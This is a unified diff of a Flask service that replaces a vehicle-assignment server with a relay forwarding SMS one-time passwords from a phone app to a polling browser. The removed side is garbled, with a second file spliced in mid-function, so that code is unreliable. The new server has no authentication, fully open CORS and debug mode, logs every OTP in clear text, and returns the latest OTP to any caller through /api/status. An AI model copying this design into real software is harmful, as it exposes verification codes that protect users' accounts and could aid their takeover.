@@ -1,149 +1,106 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import threading
+from datetime import datetime
 
 app = Flask(__name__)
 CORS(app)
 
-lock = threading.Lock()
+# Store OTPs as a list of dicts
+otp_storage = []
 
-# Shared in-memory store
-assignments = {}   # Tracks assigned count per targetName
-stored_presets = {}  # Stores presets uploaded
-
-# Endpoint to store presets and reset assignments
-@app.route('/set-presets', methods=['POST'])
-def set_presets():
-    global stored_presets, assignments
-    data = request.get_json()
-Afrom flask import Flask, request, jsonify
-from flask_cors import CORS
-import threading
-import time
-
-app = Flask(__name__)
-CORS(app)
-
-lock = threading.Lock()
-
-# OTP Store Structure
-otp_store = []  # Each entry: {token, sim, otp, timestamp}
-
-# Request session tracker
-session_tracker = {}  # Key: (token, sim), Value: first_request_time
-
-OTP_RETENTION_SECONDS = 300  # Clean up OTPs older than 5 minutes
-
-@app.route('/submit-otp', methods=['POST'])
-def submit_otp():
-    data = request.json
-    otp = data.get("otp")
-    token = data.get("token")
-    sim = data.get("sim")
-
-    if not all([otp, token, sim]):
-        return jsonify({'error': 'Missing required fields'}), 400
-
-    with lock:
-        otp_store.append({
-            'token': token,
-            'sim': sim,
-            'otp': otp,
-            'timestamp': time.time()
-        })
-
-    return jsonify({'status': 'OTP stored'}), 200
+# Track browser sessions: {(token, sim_number): {"first_request": datetime}}
+client_sessions = {}
 
 
-@app.route('/get-otp', methods=['POST'])
-def get_otp():
-    data = request.json
-    token = data.get("token")
-    sim = data.get("sim")
-
-    if not all([token, sim]):
-        return jsonify({'error': 'Missing required fields'}), 400
-
-    key = (token, sim)
-    now = time.time()
-
-    with lock:
-        # Track first request time
-        if key not in session_tracker:
-            session_tracker[key] = now
-            return jsonify({'otp': None})  # No OTP on first request
-
-        first_time = session_tracker[key]
-
-        # Find matching OTPs newer than the first request
-        recent_otp = None
-        for otp_entry in otp_store:
-            if otp_entry['token'] == token and otp_entry['sim'] == sim and otp_entry['timestamp'] > first_time:
-                recent_otp = otp_entry['otp']
-                break
-
-        if recent_otp:
-            # Clean sent OTPs and sessions
-            otp_store[:] = [entry for entry in otp_store if not (
-                entry['token'] == token and entry['sim'] == sim)]
-            del session_tracker[key]
-            return jsonify({'otp': recent_otp})
-
-    return jsonify({'otp': None})  # No new OTP yet
+def now_str():
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 
-@app.route('/cleanup', methods=['POST'])
-def cleanup():
-    """Manually trigger cleanup (optional endpoint)"""
-    now = time.time()
-    with lock:
-        otp_store[:] = [otp for otp in otp_store if now - otp['timestamp'] < OTP_RETENTION_SECONDS]
-        # Clean up very old sessions (e.g. 10 mins)
-        session_tracker_copy = session_tracker.copy()
-        for key, ts in session_tracker_copy.items():
-            if now - ts > 600:
-                del session_tracker[key]
-    return jsonify({'status': 'Cleanup done'}), 200
+@app.route('/api/receive-otp', methods=['POST'])
+def receive_otp():
+    try:
+        data = request.get_json(force=True)
+        otp = data.get('otp')
+        sim_number = data.get('sim_number') or "UnknownSIM"
+        token = data.get('token') or "unknown"
+
+        entry = {
+            "otp": otp,
+            "sim_number": sim_number,
+            "token": token,
+            "timestamp": datetime.now()
+        }
+        otp_storage.append(entry)
+
+        print(f"[{now_str()}] 📱 OTP received - OTP: {otp}, SIM: {sim_number}, Token: {token}")
+        return jsonify({"status": "success", "message": "OTP stored"}), 200
+
+    except Exception as e:
+        print("Error receiving from app:", e)
+        return jsonify({"status": "error", "message": str(e)}), 400
+
+
+@app.route('/api/get-latest-otp', methods=['GET'])
+def get_latest_otp():
+    token = request.args.get('token')
+    sim_number = request.args.get('sim_number')
+
+    if not token or not sim_number:
+        return jsonify({"status": "error", "message": "token and sim_number required"}), 400
+
+    key = (token, sim_number)
+
+    # Initialize session if first time
+    if key not in client_sessions:
+        client_sessions[key] = {"first_request": datetime.now()}
+        print(f"[{now_str()}] 🖥️ Browser started polling for {key}")
+
+    session = client_sessions[key]
+    first_request_time = session["first_request"]
+
+    # Filter OTPs for this token/sim that arrived after first poll
+    new_otps = [
+        o for o in otp_storage
+        if o["token"] == token
+        and o["sim_number"] == sim_number
+        and o["timestamp"] > first_request_time
+    ]
+
+    if new_otps:
+        latest = new_otps[-1]
+
+        # ✅ Clean up OTP storage for this token/sim
+        otp_storage[:] = [o for o in otp_storage if not (
+            o["token"] == token and o["sim_number"] == sim_number
+        )]
+
+        # ✅ Remove session after sending OTP
+        client_sessions.pop(key, None)
+
+        print(f"[{now_str()}] 🖥️ OTP sent to browser: {latest['otp']} for {key} and session cleaned")
+        return jsonify({
+            "status": "success",
+            "otp": latest["otp"],
+            "sim_number": latest["sim_number"],
+            "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
+        }), 200
+    else:
+        return jsonify({"status": "empty", "message": "No new OTP available"}), 200
+
+
+@app.route('/api/status', methods=['GET'])
+def status():
+    """Check if app is sending OTPs recently."""
+    if not otp_storage:
+        return jsonify({"status": "idle", "message": "No OTPs received yet"}), 200
+    last_otp = otp_storage[-1]
+    return jsonify({
+        "status": "active",
+        "last_otp": last_otp["otp"],
+        "sim_number": last_otp["sim_number"],
+        "timestamp": last_otp["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
+    }), 200
 
 
 if __name__ == '__main__':
     app.run(debug=True)
-
-    if not isinstance(data, dict):
-        return jsonify({"error": "Invalid presets format"}), 400
-
-    with lock:
-        stored_presets = data
-        assignments = {}  # Reset assignments when presets are updated
-
-    return jsonify({"message": "Presets stored and assignments reset."}), 200
-
-# Endpoint to assign vehicle
-@app.route('/assign-vehicle', methods=['POST'])
-def assign_vehicle():
-    global stored_presets, assignments
-    data = request.get_json()
-    target_name = data.get("targetName")
-
-    if not target_name:
-        return jsonify({"error": "Missing 'targetName'"}), 400
-
-    with lock:
-        vehicle_list = stored_presets.get(target_name)
-        if not vehicle_list:
-            return jsonify({"vehicle_number": None})  # No vehicles mapped
-
-        count = assignments.get(target_name, 0)
-
-        if count < len(vehicle_list):
-            assigned_vehicle = vehicle_list[count]
-        else:
-            assigned_vehicle = None  # No more vehicles left
-
-        assignments[target_name] = count + 1
-
-    return jsonify({"vehicle_number": assigned_vehicle})
-
-# Run the app locally
-if __name__ == '__main__':
-    app.run(debug=True, host='0.0.0.0', port=5001)
